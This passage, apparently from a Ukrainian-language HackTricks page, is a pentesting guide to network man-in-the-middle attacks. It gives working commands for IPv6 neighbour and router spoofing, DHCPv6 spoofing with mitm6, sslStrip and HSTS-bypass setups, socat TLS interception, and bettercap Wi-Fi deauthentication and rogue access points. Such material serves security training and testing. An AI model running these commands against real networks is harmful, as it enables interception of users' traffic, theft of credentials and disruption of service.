–î–æ–∫–ª–∞–¥–Ω—ñ—à–µ –ø—Ä–æ [—è–∫ –ø—ñ–¥—Ä–æ–±–∏—Ç–∏ —Å–µ—Ä–≤—ñ—Å–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [–ü—ñ–¥—Ä–æ–±–∫–∞ WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

–ë—Ä–∞—É–∑–µ—Ä–∏ –∑–∞–∑–≤–∏—á–∞–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å –ø—Ä–æ—Ç–æ–∫–æ–ª **Web Proxy Auto-Discovery (WPAD)** –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ–≥–æ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω—å –ø—Ä–æ–∫—Å—ñ. –¶–µ –≤–∫–ª—é—á–∞—î –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–∏—Ö –¥–∞–Ω–∏—Ö –∑ —Å–µ—Ä–≤–µ—Ä–∞, –∑–æ–∫—Ä–µ–º–∞ —á–µ—Ä–µ–∑ URL, —Ç–∞–∫–∏–π —è–∫ "http://wpad.example.org/wpad.dat". –í–∏—è–≤–ª–µ–Ω–Ω—è —Ü—å–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞ –∫–ª—ñ—î–Ω—Ç–∞–º–∏ –º–æ–∂–µ –≤—ñ–¥–±—É–≤–∞—Ç–∏—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ä—ñ–∑–Ω–∏—Ö –º–µ—Ö–∞–Ω—ñ–∑–º—ñ–≤:

- –ß–µ—Ä–µ–∑ **DHCP**, –¥–µ –≤–∏—è–≤–ª–µ–Ω–Ω—è —Å–ø—Ä–∏—è—î—Ç—å—Å—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º —Å–ø–µ—Ü—ñ–∞–ª—å–Ω–æ–≥–æ –∫–æ–¥—É 252.
- –ß–µ—Ä–µ–∑ **DNS**, —â–æ –≤–∫–ª—é—á–∞—î –ø–æ—à—É–∫ —ñ–º–µ–Ω—ñ —Ö–æ—Å—Ç–∞ –∑ –ø–æ–∑–Ω–∞—á–∫–æ—é _wpad_ —É –ª–æ–∫–∞–ª—å–Ω–æ–º—É –¥–æ–º–µ–Ω—ñ.
- –ß–µ—Ä–µ–∑ **Microsoft LLMNR —Ç–∞ NBT-NS**, —è–∫—ñ —î —Ä–µ–∑–µ—Ä–≤–Ω–∏–º–∏ –º–µ—Ö–∞–Ω—ñ–∑–º–∞–º–∏ —É –≤–∏–ø–∞–¥–∫–∞—Ö, –∫–æ–ª–∏ DNS-–∑–∞–ø–∏—Ç–∏ –Ω–µ –≤–¥–∞—é—Ç—å—Å—è.

–Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç Responder –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Ü–µ–π –ø—Ä–æ—Ç–æ–∫–æ–ª, –¥—ñ—é—á–∏ —è–∫ **–∑–ª–æ–≤–º–∏—Å–Ω–∏–π —Å–µ—Ä–≤–µ—Ä WPAD**. –í—ñ–Ω –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î DHCP, DNS, LLMNR —Ç–∞ NBT-NS, —â–æ–± –≤–≤–µ—Å—Ç–∏ –∫–ª—ñ—î–Ω—Ç—ñ–≤ –≤ –æ–º–∞–Ω—É —ñ –ø—ñ–¥–∫–ª—é—á–∏—Ç–∏—Å—è –¥–æ –Ω—å–æ–≥–æ. –î–ª—è –¥–æ–∫–ª–∞–¥–Ω—ñ—à–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ —Ç–µ, —è–∫ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –ø—ñ–¥—Ä–æ–±–ª–µ–Ω—ñ —Å–µ—Ä–≤—ñ—Å–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Responder, [–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ü–µ](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [–ü—ñ–¥—Ä–æ–±–∫–∞ SSDP —Ç–∞ UPnP –ø—Ä–∏—Å—Ç—Ä–æ—ó–≤](spoofing-ssdp-and-upnp-devices.md)

–í–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ–ø–æ–Ω—É–≤–∞—Ç–∏ —Ä—ñ–∑–Ω—ñ —Å–µ—Ä–≤—ñ—Å–∏ –≤ –º–µ—Ä–µ–∂—ñ, —â–æ–± **–æ–±–º–∞–Ω—É—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞** —Ç–∞ –≤–≤–µ–¥–µ–Ω–Ω—è **–ø–∞—Ä–æ–ª—ñ–≤ —É –≤—ñ–¥–∫—Ä–∏—Ç–æ–º—É —Ç–µ–∫—Å—Ç—ñ**. **–î–æ–¥–∞—Ç–∫–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –ø—Ä–æ —Ü–µ–π –∞—Ç–∞–∫—É –≤** [**–ü—ñ–¥—Ä–æ–±–∫–∞ SSDP —Ç–∞ UPnP –ø—Ä–∏—Å—Ç—Ä–æ—ó–≤**](spoofing-ssdp-and-upnp-devices.md)**.**

### –ü—ñ–¥—Ä–æ–±–∫–∞ —Å—É—Å—ñ–¥—ñ–≤ IPv6

–¶—è –∞—Ç–∞–∫–∞ –¥—É–∂–µ —Å—Ö–æ–∂–∞ –Ω–∞ ARP-–ø—ñ–¥—Ä–æ–±–∫—É, –∞–ª–µ –≤ —Å–≤—ñ—Ç—ñ IPv6. –í–∏ –º–æ–∂–µ—Ç–µ –∑–º—É—Å–∏—Ç–∏ –∂–µ—Ä—Ç–≤—É –≤–≤–∞–∂–∞—Ç–∏, —â–æ IPv6 —à–ª—é–∑–∞ –º–∞—î MAC-–∞–¥—Ä–µ—Å—É –∞—Ç–∞–∫—É—é—á–æ–≥–æ.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### –ó–ª–æ–≤–º–∏—Å–Ω–µ –ø—ñ–¥—Ä–æ–±–ª–µ–Ω–Ω—è/–∑–∞—Ç–æ–ø–ª–µ–Ω–Ω—è –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä–Ω–∏—Ö –æ–≥–æ–ª–æ—à–µ–Ω—å IPv6

–î–µ—è–∫—ñ –û–° –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –Ω–∞ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è —à–ª—é–∑—É –∑ –ø–∞–∫–µ—Ç—ñ–≤ RA, –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–∏—Ö –≤ –º–µ—Ä–µ–∂—É. –©–æ–± –≤–∏–∑–Ω–∞—á–∏—Ç–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞ —è–∫ –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä IPv6, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### –ó–∞–º—ñ–Ω–∞ DHCP –¥–ª—è IPv6

–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –¥–µ—è–∫—ñ –æ–ø–µ—Ä–∞—Ü—ñ–π–Ω—ñ —Å–∏—Å—Ç–µ–º–∏ –Ω–∞–º–∞–≥–∞—é—Ç—å—Å—è –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ DNS, —á–∏—Ç–∞—é—á–∏ –ø–∞–∫–µ—Ç DHCPv6 –≤ –º–µ—Ä–µ–∂—ñ. –¢–æ–¥—ñ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ –ø–∞–∫–µ—Ç DHCPv6, —â–æ–± –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ —Å–µ–±–µ —è–∫ DNS. DHCP —Ç–∞–∫–æ–∂ –Ω–∞–¥–∞—î IPv6 –∂–µ—Ä—Ç–≤—ñ.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (—Ñ–∞–ª—å—à–∏–≤–∞ —Å—Ç–æ—Ä—ñ–Ω–∫–∞ —Ç–∞ –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è –∫–æ–¥—É JS)

## –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç-–∞—Ç–∞–∫–∏

### sslStrip

–û—Å–Ω–æ–≤–Ω–∞ –º–µ—Ç–∞ —Ü—ñ—î—ó –∞—Ç–∞–∫–∏ –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ —É –≤–∏–ø–∞–¥–∫—É, —è–∫—â–æ **–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á** –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è **–æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø** –¥–æ —Å—Ç–æ—Ä—ñ–Ω–∫–∏ **HTTP**, —è–∫–∞ **–ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—î—Ç—å—Å—è** –Ω–∞ –≤–µ—Ä—Å—ñ—é **HTTPS**, **sslStrip** –±—É–¥–µ **–ø—ñ–¥—Ç—Ä–∏–º—É–≤–∞—Ç–∏** **HTTP-–∑'—î–¥–Ω–∞–Ω–Ω—è –∑** –∫–ª—ñ—î–Ω—Ç–æ–º —Ç–∞ **HTTPS-–∑'—î–¥–Ω–∞–Ω–Ω—è –∑** —Å–µ—Ä–≤–µ—Ä–æ–º, —â–æ–± –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å **–ø–µ—Ä–µ—Ö–æ–ø–ª—é–≤–∞—Ç–∏** –∑'—î–¥–Ω–∞–Ω–Ω—è —É **–∑–≤–∏—á–∞–π–Ω–æ–º—É —Ç–µ–∫—Å—Ç—ñ**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
–î–æ–¥–∞—Ç–∫–æ–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ [—Ç—É—Ç](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ —Ç–∞ dns2proxy –¥–ª—è –æ–±—Ö—ñ–¥—É HSTS

**–í—ñ–¥–º—ñ–Ω–Ω—ñ—Å—Ç—å** –º—ñ–∂ **sslStrip+ —Ç–∞ dns2proxy** –≤—ñ–¥ **sslStrip** –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ –≤–æ–Ω–∏ –±—É–¥—É—Ç—å **–ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—Ç–∏**, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, _**www.facebook.com**_ **–Ω–∞** _**wwww.facebook.com**_ (–∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É –Ω–∞ **–¥–æ–¥–∞—Ç–∫–æ–≤—É** "**w**") —ñ –≤—Å—Ç–∞–Ω–æ–≤–ª—è—Ç—å **–∞–¥—Ä–µ—Å—É —Ü—å–æ–≥–æ –¥–æ–º–µ–Ω—É —è–∫ IP –∞—Ç–∞–∫—É—é—á–æ–≥–æ**. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, **–∫–ª—ñ—î–Ω—Ç** –±—É–¥–µ **–ø—ñ–¥–∫–ª—é—á–∞—Ç–∏—Å—è** –¥–æ _**wwww.facebook.com**_ (**–∞—Ç–∞–∫—É—é—á–æ–≥–æ**), –∞–ª–µ –∑–∞ –∫–∞–¥—Ä–æ–º **sslstrip+** –±—É–¥–µ **–∑–±–µ—Ä—ñ–≥–∞—Ç–∏** **—Ä–µ–∞–ª—å–Ω–µ –∑'—î–¥–Ω–∞–Ω–Ω—è** —á–µ—Ä–µ–∑ https –∑ **www.facebook.com**.

**–ú–µ—Ç–∞** —Ü—ñ—î—ó —Ç–µ—Ö–Ω—ñ–∫–∏ - **—É–Ω–∏–∫–Ω—É—Ç–∏ HSTS**, –æ—Å–∫—ñ–ª—å–∫–∏ _**wwww**.facebook.com_ **–Ω–µ –±—É–¥–µ –∑–±–µ—Ä–µ–∂–µ–Ω–æ –≤ –∫–µ—à—ñ –±—Ä–∞—É–∑–µ—Ä–∞, —Ç–æ–º—É –±—Ä–∞—É–∑–µ—Ä –±—É–¥–µ –æ–±–º–∞–Ω—É—Ç–∏–π –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó facebook —á–µ—Ä–µ–∑ HTTP**.\
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ü—å–æ–≥–æ –Ω–∞–ø–∞–¥—É –ø–æ—Ç–µ—Ä–ø—ñ–ª–∏–π –ø–æ–≤–∏–Ω–µ–Ω —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ —Å–ø–æ—á–∞—Ç–∫—É –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ [http://www.faceook.com](http://www.faceook.com) —ñ –Ω–µ https. –¶–µ –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏, –∑–º—ñ–Ω–∏–≤—à–∏ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ http.

–î–æ–¥–∞—Ç–∫–æ–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ [—Ç—É—Ç](https://www.bettercap.org/legacy/#hsts-bypass), [—Ç—É—Ç](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) —Ç–∞ [—Ç—É—Ç](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip –∞–±–æ sslStrip+ –±—ñ–ª—å—à–µ –Ω–µ –ø—Ä–∞—Ü—é—é—Ç—å. –¶–µ —á–µ—Ä–µ–∑ —Ç–µ, —â–æ –≤ –±—Ä–∞—É–∑–µ—Ä–∞—Ö –∑–∞–∑–¥–∞–ª–µ–≥—ñ–¥—å –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –ø—Ä–∞–≤–∏–ª–∞ HSTS, —Ç–æ–º—É –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –≤–ø–µ—Ä—à–µ –æ—Ç—Ä–∏–º—É—î –¥–æ—Å—Ç—É–ø –¥–æ "–≤–∞–∂–ª–∏–≤–æ–≥–æ" –¥–æ–º–µ–Ω—É, –≤—ñ–Ω –æ—Ç—Ä–∏–º–∞—î –¥–æ –Ω—å–æ–≥–æ –¥–æ—Å—Ç—É–ø —á–µ—Ä–µ–∑ HTTPS. –¢–∞–∫–æ–∂ –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –∑–∞–∑–¥–∞–ª–µ–≥—ñ–¥—å –∑–±–µ—Ä–µ–∂–µ–Ω—ñ –ø—Ä–∞–≤–∏–ª–∞ —Ç–∞ —ñ–Ω—à—ñ –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω—ñ –ø—Ä–∞–≤–∏–ª–∞ –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –ø—Ä–∞–ø–æ—Ä–µ—Ü—å** [**`includeSubdomains`**](https://hstspreload.appspot.com) **—Ç–æ–º—É –ø—Ä–∏–∫–ª–∞–¥ –∑ _**wwww.facebook.com**_ –∑–∞–∑–Ω–∞—á–µ–Ω–∏–π –≤–∏—â–µ –±—ñ–ª—å—à–µ –Ω–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏–º–µ, –æ—Å–∫—ñ–ª—å–∫–∏** _**facebook.com**_ **–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î HSTS –∑ `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP –ø—Ä–æ—Å–ª—É—Ö–æ–≤—É–≤–∞–Ω–Ω—è –Ω–∞ –ø–æ—Ä—Ç—É
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL –ø—Ä–æ—Å–ª—É—Ö–æ–≤—É–≤–∞–Ω–Ω—è –Ω–∞ –ø–æ—Ä—Ç—É

#### –ó–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ –∫–ª—é—á—ñ —Ç–∞ —Å–∞–º–æ–ø—ñ–¥–ø–∏—Å–∞–Ω–∏–π —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### –ü—Ä–æ—Å–ª—É—Ö–æ–≤—É–≤–∞–Ω–Ω—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### –°–ª—É—Ö–∞—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ —Ç–∞ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—Ç–∏ –Ω–∞ —Ö–æ—Å—Ç–∏
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
–Ü–Ω–æ–¥—ñ, —è–∫—â–æ –∫–ª—ñ—î–Ω—Ç –ø–µ—Ä–µ–≤—ñ—Ä—è—î, —â–æ –°–ê —î –¥—ñ–π—Å–Ω–∏–º, –≤–∏ –º–æ–∂–µ—Ç–µ **–ø–æ–¥–∞–≤–∞—Ç–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç —ñ–Ω—à–æ–≥–æ —Ö–æ—Å—Ç–∞, –ø—ñ–¥–ø–∏—Å–∞–Ω–∏–π –°–ê**. –©–µ –æ–¥–Ω–µ —Ü—ñ–∫–∞–≤–µ —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è - —Ü–µ –ø–æ–¥–∞—á–∞ **—Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ –∑–∞–ø–∏—Ç–∞–Ω–æ–≥–æ —Ö–æ—Å—Ç–∞, –∞–ª–µ —Å–∞–º–æ–ø—ñ–¥–ø–∏—Å–∞–Ω–æ–≥–æ**.

–Ü–Ω—à—ñ —Ä–µ—á—ñ –¥–ª—è —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è - —Å–ø—Ä–æ–±—É–π—Ç–µ –ø—ñ–¥–ø–∏—Å–∞—Ç–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –¥—ñ–π—Å–Ω–∏–º —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–æ–º, —è–∫–∏–π –Ω–µ —î –¥—ñ–π—Å–Ω–∏–º –°–ê. –ê–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ –¥—ñ–π—Å–Ω–∏–π –≤—ñ–¥–∫—Ä–∏—Ç–∏–π –∫–ª—é—á, –∑–º—É—à—É–π—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∞–ª–≥–æ—Ä–∏—Ç–º, —è–∫, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –î—ñ—Ñ—Ñ—ñ-–ì–µ–ª–ª–º–∞–Ω (—Ç–æ–π, —â–æ –Ω–µ –ø–æ—Ç—Ä–µ–±—É—î —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è —á–æ–≥–æ-–Ω–µ–±—É–¥—å –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ä–µ–∞–ª—å–Ω–æ–≥–æ –ø—Ä–∏–≤–∞—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞), —ñ –∫–æ–ª–∏ –∫–ª—ñ—î–Ω—Ç –∑–∞–ø–∏—Ç—É—î –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è —Ä–µ–∞–ª—å–Ω–æ–≥–æ –ø—Ä–∏–≤–∞—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —Ö–µ—à), –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ —Ñ–∞–ª—å—à–∏–≤–µ –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è —ñ –æ—á—ñ–∫—É–π—Ç–µ, —â–æ –∫–ª—ñ—î–Ω—Ç —Ü—å–æ–≥–æ –Ω–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç—å.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### –ê–∫—Ç–∏–≤–Ω—ñ –ø—Ä–∏–º—ñ—Ç–∫–∏ –ø—Ä–æ –≤—ñ–¥–∫—Ä–∏—Ç—Ç—è

–í—Ä–∞—Ö–æ–≤—É–π—Ç–µ, —â–æ –∫–æ–ª–∏ –ø–∞–∫–µ—Ç UDP –Ω–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è –Ω–∞ –ø—Ä–∏—Å—Ç—Ä—ñ–π, —è–∫–∏–π –Ω–µ –º–∞—î –∑–∞–ø–∏—Ç–∞–Ω–æ–≥–æ –ø–æ—Ä—Ç—É, –≤—ñ–¥–ø—Ä–∞–≤–ª—è—î—Ç—å—Å—è ICMP (–ü–æ—Ä—Ç –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∏–π).

### **ARP –≤—ñ–¥–∫—Ä–∏—Ç—Ç—è**

–ü–∞–∫–µ—Ç–∏ ARP –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è IP-–∞–¥—Ä–µ—Å, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –≤ –º–µ—Ä–µ–∂—ñ. –ü–ö –ø–æ–≤–∏–Ω–µ–Ω –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –∑–∞–ø–∏—Ç –¥–ª—è –∫–æ–∂–Ω–æ–≥–æ –º–æ–∂–ª–∏–≤–æ–≥–æ IP-–∞–¥—Ä–µ—Å–∏, —ñ –ª–∏—à–µ —Ç—ñ, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è, –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—Ç–∏–º—É—Ç—å.

### **mDNS (multicast DNS)**

Bettercap –Ω–∞–¥—Å–∏–ª–∞—î –∑–∞–ø–∏—Ç MDNS (–∫–æ–∂–Ω—ñ X –º—Å) –¥–ª—è **\_services\_.dns-sd.\_udp.local**, –º–∞—à–∏–Ω–∞, —è–∫–∞ –±–∞—á–∏—Ç—å —Ü–µ–π –ø–∞–∫–µ—Ç, –∑–∞–∑–≤–∏—á–∞–π –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î –Ω–∞ —Ü–µ–π –∑–∞–ø–∏—Ç. –ü–æ—Ç—ñ–º –≤—ñ–Ω —à—É–∫–∞—î –ª–∏—à–µ –º–∞—à–∏–Ω–∏, —è–∫—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å –Ω–∞ "services".

**–Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios Name Server)**

Bettercap —Ä–æ–∑—Å–∏–ª–∞—î –ø–∞–∫–µ—Ç–∏ –Ω–∞ –ø–æ—Ä—Ç 137/UDP, –∑–∞–ø–∏—Ç—É—é—á–∏ —ñ–º'—è "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap —Ä–æ–∑—Å–∏–ª–∞—î –ø–∞–∫–µ—Ç–∏ SSDP, —à—É–∫–∞—é—á–∏ –≤—Å—ñ –≤–∏–¥–∏ —Å–µ—Ä–≤—ñ—Å—ñ–≤ (UDP Port 1900).

### **WSD (Web Service Discovery)**

Bettercap —Ä–æ–∑—Å–∏–ª–∞—î –ø–∞–∫–µ—Ç–∏ WSD, —à—É–∫–∞—é—á–∏ —Å–µ—Ä–≤—ñ—Å–∏ (UDP Port 3702).

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
* **Network Security Assessment: Know Your Network (3rd edition)**
* **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
* [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**–ü—ñ–¥–∫–∞–∑–∫–∞ —â–æ–¥–æ –±–∞–≥—ñ–≤**: **–∑–∞—Ä–µ—î—Å—Ç—Ä—É–π—Ç–µ—Å—å** –Ω–∞ **Intigriti**, –ø—Ä–µ–º—ñ–∞–ª—å–Ω—É **–ø–ª–∞—Ç—Ñ–æ—Ä–º—É –¥–ª—è –ø–æ—à—É–∫—É –±–∞–≥—ñ–≤, —Å—Ç–≤–æ—Ä–µ–Ω—É —Ö–∞–∫–µ—Ä–∞–º–∏ –¥–ª—è —Ö–∞–∫–µ—Ä—ñ–≤**! –ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ –Ω–∞—Å –Ω–∞ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) —Å—å–æ–≥–æ–¥–Ω—ñ, —ñ –ø–æ—á–Ω—ñ—Ç—å –∑–∞—Ä–æ–±–ª—è—Ç–∏ –≤–∏–Ω–∞–≥–æ—Ä–æ–¥–∏ –¥–æ **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

